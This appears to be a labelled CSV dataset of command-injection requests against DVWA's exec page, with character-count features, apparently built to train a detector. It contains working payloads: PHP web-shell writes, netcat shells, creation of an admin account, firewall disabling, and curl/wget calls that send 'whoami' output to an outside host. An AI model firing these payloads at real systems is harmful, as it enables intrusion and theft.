Method,Path,Body,Single Quotes,Double Quotes,Dashes,Braces,Spaces,Tags,Colons,Backtick,Bad Words,XSS Check,XSS Word,Cmdi Word,Cmdi Check,Class
POST,/DVWA/vulnerabilities/exec/,ip=& dir C:\&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& dir C:\&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=dir C:\&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| dir C:\Documents and Settings\*&Submit=Submit,0,0,0,0,4,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; dir C:\Documents and Settings\*&Submit=Submit,0,0,0,0,4,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& dir C:\Documents and Settings\*&Submit=Submit,0,0,0,0,4,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& dir C:\Documents and Settings\*&Submit=Submit,0,0,0,0,4,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=dir C:\Documents and Settings\*&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| dir C:\Users&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; dir C:\Users&Submit=Submit,0,0,0,0,2,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& dir C:\Users&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& dir C:\Users&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=dir C:\Users&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;echo%20'<script>alert(1)</script>'&Submit=Submit,2,0,0,1,0,4,1,0,0,0,1,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX&Submit=Submit,2,0,0,2,5,4,0,0,0,0,1,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=| echo ""<?php include($_GET['page'])| ?>"" > rfi.php&Submit=Submit",2,2,0,1,6,3,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=; echo ""<?php include($_GET['page']); ?>"" > rfi.php&Submit=Submit",2,2,0,1,6,3,2,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=& echo ""<?php include($_GET['page']); ?>"" > rfi.php&Submit=Submit",2,2,0,1,6,3,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=&& echo ""<?php include($_GET['page']); ?>"" > rfi.php&Submit=Submit",2,2,0,1,6,3,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=echo ""<?php include($_GET['page']); ?>"" > rfi.php&Submit=Submit",2,2,0,1,5,3,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php &Submit=Submit",4,2,0,1,8,3,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php &Submit=Submit",4,2,0,1,8,3,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php &Submit=Submit",4,2,0,1,8,3,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php &Submit=Submit",4,2,0,1,8,3,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php&Submit=Submit",4,2,0,1,6,3,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php&Submit=Submit",2,2,0,1,6,3,0,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php&Submit=Submit",2,2,0,1,6,3,2,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php&Submit=Submit",2,2,0,1,6,3,1,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php&Submit=Submit",2,2,0,1,6,3,1,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=echo ""<?php system($_GET['cmd']); ?>"" > cmd.php&Submit=Submit",2,2,0,1,5,3,1,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;echo '<script>alert(1)</script>'&Submit=Submit,2,0,0,1,1,4,1,0,0,0,1,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=echo '<script>alert(1)</script>'// XXXXXXXXXXX&Submit=Submit,2,0,0,1,2,4,0,0,0,0,1,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX&Submit=Submit,2,0,0,0,3,4,0,0,0,0,1,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=() { :;}; echo vulnerable 10&Submit=Submit,0,0,0,3,5,0,2,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=eval('ls')&Submit=Submit,2,0,0,1,0,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=eval('pwd')&Submit=Submit,2,0,0,1,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=eval('pwd');&Submit=Submit,2,0,0,1,0,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=eval('sleep 5')&Submit=Submit,2,0,0,1,1,0,0,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=eval('sleep 5');&Submit=Submit,2,0,0,1,1,0,1,0,1,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=eval('whoami')&Submit=Submit,2,0,0,1,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=eval('whoami');&Submit=Submit,2,0,0,1,0,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=exec('ls')&Submit=Submit,2,0,0,1,0,0,0,0,0,0,0,3,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=exec('pwd')&Submit=Submit,2,0,0,1,0,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=exec('pwd');&Submit=Submit,2,0,0,1,0,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=exec('sleep 5')&Submit=Submit,2,0,0,1,1,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=exec('sleep 5');&Submit=Submit,2,0,0,1,1,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=exec('whoami')&Submit=Submit,2,0,0,1,0,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=exec('whoami');&Submit=Submit,2,0,0,1,0,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=;{$_GET[""cmd""]}&Submit=Submit",0,2,0,2,0,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=`id`&Submit=Submit,0,0,0,0,0,0,0,2,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| id&Submit=Submit,0,0,0,0,1,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;id&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;id|&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;id;&Submit=Submit,0,0,0,0,0,0,2,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& id&Submit=Submit,0,0,0,0,1,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&&id&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;id\n&Submit=Submit,0,0,0,0,0,0,1,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ifconfig&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| ifconfig&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; ifconfig&Submit=Submit,0,0,0,0,1,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ifconfig&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& ifconfig&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=/index.html|id|&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ipconfig&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| ipconfig /all&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; ipconfig /all&Submit=Submit,0,0,0,0,2,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ipconfig /all&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& ipconfig /all&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ipconfig /all&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ls&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=$(`ls`)&Submit=Submit,0,0,0,1,0,0,0,2,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| ls -l /&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; ls -l /&Submit=Submit,0,0,0,0,3,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ls -l /&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& ls -l /&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ls -l /&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| ls -laR /etc&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; ls -laR /etc&Submit=Submit,0,0,0,0,3,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ls -laR /etc&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& ls -laR /etc&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| ls -laR /var/www&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; ls -laR /var/www&Submit=Submit,0,0,0,0,3,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ls -laR /var/www&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& ls -laR /var/www&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| ls -l /etc/&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; ls -l /etc/&Submit=Submit,0,0,0,0,3,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ls -l /etc/&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& ls -l /etc/&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ls -l /etc/&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ls -lh /etc/&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| ls -l /home/*&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; ls -l /home/*&Submit=Submit,0,0,0,0,3,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ls -l /home/*&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& ls -l /home/*&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ls -l /home/*&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=*; ls -lhtR /var/www/&Submit=Submit,0,0,0,0,3,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| ls -l /tmp&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; ls -l /tmp&Submit=Submit,0,0,0,0,3,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ls -l /tmp&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& ls -l /tmp&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ls -l /tmp&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| ls -l /var/www/*&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; ls -l /var/www/*&Submit=Submit,0,0,0,0,3,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& ls -l /var/www/*&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& ls -l /var/www/*&Submit=Submit,0,0,0,0,3,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=ls -l /var/www/*&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\n&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`&Submit=Submit,0,0,0,0,1,0,0,2,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`&Submit=Submit,0,0,0,0,1,0,0,2,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\n/bin/ls -al\n&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| nc -lvvp 4444 -e /bin/sh|&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; nc -lvvp 4444 -e /bin/sh;&Submit=Submit,0,0,0,0,5,0,2,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& nc -lvvp 4444 -e /bin/sh&&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& nc -lvvp 4444 -e /bin/sh &&Submit=Submit,0,0,0,0,6,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=nc -lvvp 4444 -e /bin/sh&Submit=Submit,0,0,0,0,4,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=nc -lvvp 4445 -e /bin/sh &&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=nc -lvvp 4446 -e /bin/sh|&Submit=Submit,0,0,0,0,4,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=nc -lvvp 4447 -e /bin/sh;&Submit=Submit,0,0,0,0,4,0,1,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=nc -lvvp 4448 -e /bin/sh&&Submit=Submit,0,0,0,0,4,0,0,0,0,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\necho INJECTX\nexit\n\033[2Asleep 5\n&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| net localgroup Administrators hacker /ADD&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; net localgroup Administrators hacker /ADD&Submit=Submit,0,0,0,0,5,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& net localgroup Administrators hacker /ADD&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& net localgroup Administrators hacker /ADD&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=net localgroup Administrators hacker /ADD&Submit=Submit,0,0,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| netsh firewall set opmode disable&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; netsh firewall set opmode disable&Submit=Submit,0,0,0,0,5,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& netsh firewall set opmode disable&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& netsh firewall set opmode disable&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=netsh firewall set opmode disable&Submit=Submit,0,0,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=netstat&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=;netstat -a;&Submit=Submit,0,0,0,0,1,0,2,0,0,0,1,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| netstat -an&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; netstat -an&Submit=Submit,0,0,0,0,2,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& netstat -an&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& netstat -an&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=netstat -an&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| net user hacker Password1 /ADD&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; net user hacker Password1 /ADD&Submit=Submit,0,0,0,0,5,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& net user hacker Password1 /ADD&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& net user hacker Password1 /ADD&Submit=Submit,0,0,0,0,5,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=net user hacker Password1 /ADD&Submit=Submit,0,0,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| net view&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=; net view&Submit=Submit,0,0,0,0,2,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=& net view&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=&& net view&Submit=Submit,0,0,0,0,2,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=net view&Submit=Submit,0,0,0,0,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\nid|&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\nid;&Submit=Submit,0,0,0,0,0,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\nid\n&Submit=Submit,0,0,0,0,0,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=\n/usr/bin/id\n&Submit=Submit,0,0,0,0,0,0,0,0,1,0,0,2,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=perl -e 'print ""X""x1024'&Submit=Submit",2,2,0,0,3,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=|| perl -e 'print ""X""x16096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=| perl -e 'print ""X""x16096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=; perl -e 'print ""X""x16096'&Submit=Submit",2,2,0,0,4,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=& perl -e 'print ""X""x16096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=&& perl -e 'print ""X""x16096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=perl -e 'print ""X""x16384'&Submit=Submit",2,2,0,0,3,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=; perl -e 'print ""X""x2048'&Submit=Submit",2,2,0,0,4,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=& perl -e 'print ""X""x2048'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=&& perl -e 'print ""X""x2048'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=perl -e 'print ""X""x2048'&Submit=Submit",2,2,0,0,3,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=|| perl -e 'print ""X""x4096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=| perl -e 'print ""X""x4096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=; perl -e 'print ""X""x4096'&Submit=Submit",2,2,0,0,4,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=& perl -e 'print ""X""x4096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=&& perl -e 'print ""X""x4096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=perl -e 'print ""X""x4096'&Submit=Submit",2,2,0,0,3,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=|| perl -e 'print ""X""x8096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=| perl -e 'print ""X""x8096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=; perl -e 'print ""X""x8096'&Submit=Submit",2,2,0,0,4,0,1,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=&& perl -e 'print ""X""x8096'&Submit=Submit",2,2,0,0,4,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=perl -e 'print ""X""x8192'&Submit=Submit",2,2,0,0,3,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,"ip=perl -e 'print ""X""x81920'&Submit=Submit",2,2,0,0,3,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=|| phpinfo()&Submit=Submit,0,0,0,1,1,0,0,0,0,0,0,1,6,cmdi
POST,/DVWA/vulnerabilities/exec/,ip=| phpinfo()&Submit=Submit,0,0,0,1,1,0,0,0,0,0,0,1,6,cmdi
